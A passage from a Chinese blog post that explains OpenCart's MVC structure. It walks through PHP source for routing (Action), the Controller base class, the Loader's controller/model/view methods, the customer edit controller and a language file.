class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($route)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;id = $route;</span><br><span class="line">$parts = explode(<span class="string">'/'</span>, preg_replace(<span class="string">'/[^a-zA-Z0-9_\/]/'</span>, <span class="string">''</span>, (string)$route));</span><br><span class="line"><span class="comment">// Break apart the route</span></span><br><span class="line"><span class="keyword">while</span> ($parts) &#123;</span><br><span class="line">$file = DIR_APPLICATION . <span class="string">'controller/'</span> . implode(<span class="string">'/'</span>, $parts) . <span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (is_file($file)) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;route = implode(<span class="string">'/'</span>, $parts);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;method = array_pop($parts);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($registry, array $args = array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line"><span class="comment">// Stop any magical methods being called</span></span><br><span class="line"><span class="keyword">if</span> (substr(<span class="keyword">$this</span>-&gt;method, <span class="number">0</span>, <span class="number">2</span>) == <span class="string">'__'</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'Error: Calls to magic methods are not allowed!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$file = DIR_APPLICATION . <span class="string">'controller/'</span> . <span class="keyword">$this</span>-&gt;route . <span class="string">'.php'</span>;</span><br><span class="line">$class = <span class="string">'Controller'</span> . preg_replace(<span class="string">'/[^a-zA-Z0-9]/'</span>, <span class="string">''</span>, <span class="keyword">$this</span>-&gt;route);</span><br><span class="line"><span class="comment">// Initialize the class</span></span><br><span class="line"><span class="keyword">if</span> (is_file($file)) &#123;</span><br><span class="line"><span class="keyword">include_once</span>($file);</span><br><span class="line">$controller = <span class="keyword">new</span> $class($registry);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'Error: Could not call '</span> . <span class="keyword">$this</span>-&gt;route . <span class="string">'/'</span> . <span class="keyword">$this</span>-&gt;method . <span class="string">'!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$reflection = <span class="keyword">new</span> ReflectionClass($class);</span><br><span class="line"><span class="keyword">if</span> ($reflection-&gt;hasMethod(<span class="keyword">$this</span>-&gt;method) &amp;&amp; $reflection-&gt;getMethod(<span class="keyword">$this</span>-&gt;method)-&gt;getNumberOfRequiredParameters() &lt;= count($args)) &#123;</span><br><span class="line"><span class="keyword">return</span> call_user_func_array(<span class="keyword">array</span>($controller, <span class="keyword">$this</span>-&gt;method), $args);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'Error: Could not call '</span> . <span class="keyword">$this</span>-&gt;route . <span class="string">'/'</span> . <span class="keyword">$this</span>-&gt;method . <span class="string">'!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其实不必要把整个架构的细节都给看完，因为其中涉及了比较多的校验和错误捕捉和处理。所以以上代码实际处理业务的部分就是router后参数的拆分，然后进行一些校验，合格的话就去include一个controller类然后实例化它，最后以拆分好的形式传入<code>call_user_func_array</code>。其实拆分的原则就是通过router参数以<code>/</code>进行拆分，然后字符串连接，到admin的相应文件夹下去获取相应类的文件路径。在这里<code>?route=customer/customer</code>其实就是调用customer/customer.php文件里定义的类，然后通过<code>$controller = new $class($registry);</code>实例化它。然后就是条用<code>call_func_array</code>来执行controller类里面的method，传入的参数为$args，这里有个点就是在默认的情况下，调用的方法为<code>index</code>。接下来我们就要进入admin/contorller/customer/customer.php一探究竟，弄个清楚到底这个controller处理了哪些业务逻辑以及如何和Model，View进行交互。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ControllerCustomerCustomer extends Controller &#123;</span><br><span class="line">private $error = array();</span><br><span class="line"></span><br><span class="line">public function index() &#123;</span><br><span class="line">$this-&gt;load-&gt;language(&apos;customer/customer&apos;);</span><br><span class="line"></span><br><span class="line">$this-&gt;document-&gt;setTitle($this-&gt;language-&gt;get(&apos;heading_title&apos;));</span><br><span class="line"></span><br><span class="line">$this-&gt;load-&gt;model(&apos;customer/customer&apos;);</span><br><span class="line"></span><br><span class="line">$this-&gt;getList();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>这个文件内容比较多，不太适合全部copy到这里来进行分析，但是通过ControllerCustomerCustomer类的一些方法举例来阐述MVC的概念就可以起到不错的分析效果。当然在深入解析这个过程的时候，我们首先需要理解一下$this-&gt;load方法的实现原理。了解过面像对象编程的兄弟可能一时无法理解基类没有load方法，而本类也没有实现该方法，那么这个方法是如何得以调用实现的呢？先不急，我们先来看个比较神奇的php魔术方法举例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a=<span class="string">'h'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $c=<span class="string">'hello'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $key;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b=<span class="keyword">new</span> test();</span><br><span class="line">$b-&gt;load;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>试想一下，运行这段代码，我们会得到什么结果？答案是:load。是的，在调用一个不存在的或者没有访问权限的对象的时候，类会主动调用<strong>get().方法，而load就会作为参数传入</strong>get()函数。那么举这个例子和我们理解上面代码有什么关系呢？我们可以看到Controller基类的代码实现如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($registry)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;registry = $registry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;registry-&gt;get($key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;registry-&gt;set($key, $value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>是的同样实现了__get()方法，这样我们就会调用它，最后他会返回一个registry-&gt;get(“load”)传回的对象，参考上面的Register类的定义以及framework.php的注册变量过程，我们可以发现，这里其实返回的是一个Loader对象，而Loader对象的定义如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Loader</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $registry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>    object $registry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($registry)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;registry = $registry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">controller</span><span class="params">($route)</span> </span>&#123;</span><br><span class="line">$args = func_get_args();</span><br><span class="line"></span><br><span class="line">array_shift($args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize the call</span></span><br><span class="line">$route = preg_replace(<span class="string">'/[^a-zA-Z0-9_\/]/'</span>, <span class="string">''</span>, (string)$route);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Keep the original trigger</span></span><br><span class="line">$trigger = $route;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Trigger the pre events</span></span><br><span class="line">$result = <span class="keyword">$this</span>-&gt;registry-&gt;get(<span class="string">'event'</span>)-&gt;trigger(<span class="string">'controller/'</span> . $trigger . <span class="string">'/before'</span>, <span class="keyword">array</span>(&amp;$route, &amp;$args));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure its only the last event that returns an output if required.</span></span><br><span class="line"><span class="keyword">if</span> ($result != <span class="keyword">null</span> &amp;&amp; !$result <span class="keyword">instanceof</span> <span class="keyword">Exception</span>) &#123;</span><br><span class="line">$output = $result;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$action = <span class="keyword">new</span> Action($route);</span><br><span class="line">$output = $action-&gt;execute(<span class="keyword">$this</span>-&gt;registry, $args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Trigger the post events</span></span><br><span class="line">$result = <span class="keyword">$this</span>-&gt;registry-&gt;get(<span class="string">'event'</span>)-&gt;trigger(<span class="string">'controller/'</span> . $trigger . <span class="string">'/after'</span>, <span class="keyword">array</span>(&amp;$route, &amp;$args, &amp;$output));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($result &amp;&amp; !$result <span class="keyword">instanceof</span> <span class="keyword">Exception</span>) &#123;</span><br><span class="line">$output = $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$output <span class="keyword">instanceof</span> <span class="keyword">Exception</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> $output;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">model</span><span class="params">($route)</span> </span>&#123;</span><br><span class="line"><span class="comment">// Sanitize the call</span></span><br><span class="line">$route = preg_replace(<span class="string">'/[^a-zA-Z0-9_\/]/'</span>, <span class="string">''</span>, (string)$route);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;registry-&gt;has(<span class="string">'model_'</span> . str_replace(<span class="string">'/'</span>, <span class="string">'_'</span>, $route))) &#123;</span><br><span class="line">$file = DIR_APPLICATION . <span class="string">'model/'</span> . $route . <span class="string">'.php'</span>;</span><br><span class="line">$class = <span class="string">'Model'</span> . preg_replace(<span class="string">'/[^a-zA-Z0-9]/'</span>, <span class="string">''</span>, $route);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_file($file)) &#123;</span><br><span class="line"><span class="keyword">include_once</span>($file);</span><br><span class="line"></span><br><span class="line">$proxy = <span class="keyword">new</span> Proxy();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Overriding models is a little harder so we have to use PHP's magic methods</span></span><br><span class="line"><span class="comment">// In future version we can use runkit</span></span><br><span class="line"><span class="keyword">foreach</span> (get_class_methods($class) <span class="keyword">as</span> $method) &#123;</span><br><span class="line">$proxy-&gt;&#123;$method&#125; = <span class="keyword">$this</span>-&gt;callback($route . <span class="string">'/'</span> . $method);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;registry-&gt;set(<span class="string">'model_'</span> . str_replace(<span class="string">'/'</span>, <span class="string">'_'</span>, (string)$route), $proxy);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'Error: Could not load model '</span> . $route . <span class="string">'!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view</span><span class="params">($route, $data = array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line"><span class="comment">// Sanitize the call</span></span><br><span class="line">$route = preg_replace(<span class="string">'/[^a-zA-Z0-9_\/]/'</span>, <span class="string">''</span>, (string)$route);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Keep the original trigger</span></span><br><span class="line">$trigger = $route;</span><br><span class="line"></span><br><span class="line">$template = <span class="keyword">new</span> Template(<span class="keyword">$this</span>-&gt;registry-&gt;get(<span class="string">'config'</span>)-&gt;get(<span class="string">'template_engine'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Trigger the pre events</span></span><br><span class="line">$result = <span class="keyword">$this</span>-&gt;registry-&gt;get(<span class="string">'event'</span>)-&gt;trigger(<span class="string">'view/'</span> . $trigger . <span class="string">'/before'</span>, <span class="keyword">array</span>(&amp;$route, &amp;$data, &amp;$template));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure its only the last event that returns an output if required.</span></span><br><span class="line"><span class="keyword">if</span> ($result &amp;&amp; !$result <span class="keyword">instanceof</span> <span class="keyword">Exception</span>) &#123;</span><br><span class="line">$output = $result;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$template-&gt;set($key, $value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$output = $template-&gt;render(<span class="keyword">$this</span>-&gt;registry-&gt;get(<span class="string">'config'</span>)-&gt;get(<span class="string">'template_directory'</span>) . $route, <span class="keyword">$this</span>-&gt;registry-&gt;get(<span class="string">'config'</span>)-&gt;get(<span class="string">'template_cache'</span>));</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><p>所以到这里就可以大致了解load方法调用的本质。所以说Loader是和Router类是在MVC架构中十分重要的两个组件。理解到这里，我们就来继续看下ControllerCustomerCustomer类的具体实现，了解它和view,modle的交互。通过下图可以看到整个ControllerCustomerCustomer 的代码量比较大，为了理解MVC没有必要把每一个方法的实现都理解透彻，我们可以举几个比较典型的方法的实现来阐述MVC的实现过程。</p><p><img src="/myimages/MVC/class_content.jpg" alt="image"></p><p>为了演示，在前端界面我们点击edit图标，可以看到对应的url参数有了变化,变成了<code>localhost/OpenCart/upload/admin/index.php?route=customer/customer/edit&amp;user_token=QcODkXWS5tEYdqb03TXRXdqgzsoaGAMp&amp;customer_id=1</code>,同样的界面变化如下：</p><p><img src="/myimages/MVC/edit.jpg" alt="image"></p><p>根据我们之前的了解，这里是调用了ControllerCustomerCustomer类的edit方法，而edit方法的实现代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">edit</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;load-&gt;language(<span class="string">'customer/customer'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;document-&gt;setTitle(<span class="keyword">$this</span>-&gt;language-&gt;get(<span class="string">'heading_title'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;load-&gt;model(<span class="string">'customer/customer'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">$this</span>-&gt;request-&gt;server[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">'POST'</span>) &amp;&amp; <span class="keyword">$this</span>-&gt;validateForm()) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;model_customer_customer-&gt;editCustomer(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'customer_id'</span>], <span class="keyword">$this</span>-&gt;request-&gt;post);</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;session-&gt;data[<span class="string">'success'</span>] = <span class="keyword">$this</span>-&gt;language-&gt;get(<span class="string">'text_success'</span>);</span><br><span class="line"></span><br><span class="line">$url = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_name'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;filter_name='</span> . urlencode(html_entity_decode(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_name'</span>], ENT_QUOTES, <span class="string">'UTF-8'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_email'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;filter_email='</span> . urlencode(html_entity_decode(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_email'</span>], ENT_QUOTES, <span class="string">'UTF-8'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_customer_group_id'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;filter_customer_group_id='</span> . <span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_customer_group_id'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_status'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;filter_status='</span> . <span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_status'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_ip'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;filter_ip='</span> . <span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_ip'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_date_added'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;filter_date_added='</span> . <span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_date_added'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'sort'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;sort='</span> . <span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'sort'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'order'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;order='</span> . <span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'order'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'page'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;page='</span> . <span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'page'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;response-&gt;redirect(<span class="keyword">$this</span>-&gt;url-&gt;link(<span class="string">'customer/customer'</span>, <span class="string">'user_token='</span> . <span class="keyword">$this</span>-&gt;session-&gt;data[<span class="string">'user_token'</span>] . $url));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;getForm();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在这个函数中加载了<code>model_customer_customer</code>这个Model接口来进行相关的数据查询（至于为啥是这样一个方法，这是一个开发时候的规定，通过特定的方法来实现Model中ModelCustomerCustomer映射成为controller里面的类model_customer_customer），然后其他的一些逻辑是通过获取post,get获取的参数做一些逻辑判断（这一部分的代码实现在system/library里面，有兴趣的可以自己去看下，post,get,session等的底层封装实现），最后调用了getFrom的方法来实现与View的连接。另外需要注意的是，在opencart中除了MVC外还有个L部分，就是language。所谓的language就是一些需要在不同业务逻辑中显示在客户端的语句，这里也单独进行了分离编写，通过$this-&gt;load-&gt;language(‘customer/customer’)调用。在这里admin/language/customer/customer/customer.php language的内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Heading</span><br><span class="line">$_[&apos;heading_title&apos;]         = &apos;Customers&apos;;</span><br><span class="line"></span><br><span class="line">// Text</span><br><span class="line">$_[&apos;text_success&apos;]          = &apos;Success: You have modified customers!&apos;;</span><br><span class="line">$_[&apos;text_list&apos;]             = &apos;Customer List&apos;;</span><br><span class="line">$_[&apos;text_add&apos;]              = &apos;Add Customer&apos;;</span><br><span class="line">$_[&apos;text_edit&apos;]             = &apos;Edit Customer&apos;;</span><br><span class="line">$_[&apos;text_default&apos;]          = &apos;Default&apos;;</span><br><span class="line">$_[&apos;text_account&apos;]          = &apos;Customer Details&apos;;</span><br><span class="line">$_[&apos;text_password&apos;]         = &apos;Password&apos;;</span><br><span class="line">$_[&apos;text_other&apos;]            = &apos;Other&apos;;</span><br><span class="line">$_[&apos;text_balance&apos;]          = &apos;Balance&apos;;</span><br><span class="line">$_[&apos;text_address&apos;]          = &apos;Address&apos;;</span><br><span class="line">$_[&apos;text_history&apos;]          = &apos;History&apos;;</span><br><span class="line">$_[&apos;text_history_add&apos;]      = &apos;Add History&apos;;</span><br><span class="line">$_[&apos;text_transaction&apos;]      = &apos;Transactions&apos;;</span><br><span class="line">$_[&apos;text_transaction_add&apos;]  = &apos;Add Transaction&apos;;</span><br><span class="line">$_[&apos;text_reward&apos;]           = &apos;Reward Points&apos;;</span><br><span class="line">$_[&apos;text_reward_add&apos;]       = &apos;Add Reward Points&apos;;</span><br><span 